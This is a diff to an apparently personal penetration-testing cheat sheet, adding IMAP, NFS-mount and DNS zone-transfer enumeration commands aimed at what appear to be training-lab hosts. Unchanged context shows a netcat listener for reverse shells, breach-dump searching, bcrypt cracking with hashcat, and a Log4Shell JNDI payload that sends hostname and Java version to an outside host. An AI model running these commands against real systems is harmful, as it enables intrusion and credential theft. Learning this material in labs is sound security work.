@@ -33,6 +33,9 @@ zgrep -ia "@domain.de" BreachCompilation.tar.gz
 Listening for shells (bash):
 nc -nvlp 1337
 
+# IMAP (imap, pop3, TSL)
+openssl s_client -connect 10.129.14.128:imaps
+
 # HASHCAT (hashcat)
 Crack bcrypt hashes:
 hashcat -m 3200 bcrypt.hash /usr/share/wordlists/rockyou.txt 
@@ -344,7 +347,15 @@ ${jndi:${lower:l}${lower:d}a${lower:p}://${hostName}.${sys:java.version}.xx.inte
 enum4linux 10.10.82.233
 
 # SMBCLIENT
-smbclient \\\\ip\\nt4wrksv
+smbclient \\\\ip\\sharename
+
+# NFS (nfs, network share, linux)
+showmount -e 10.129.57.246
+mkdir nfsmount
+mount -t nfs 10.129.57.246:/ ./nfsmount/ -o nolock
+
+# dig (dns, ns, nameserver, zone transfer)
+dig axfr internal.inlanefreight.htb @10.129.216.3
 
 # METASPLOIT (metasploit, msfconsole)
 Basic msfconsole:
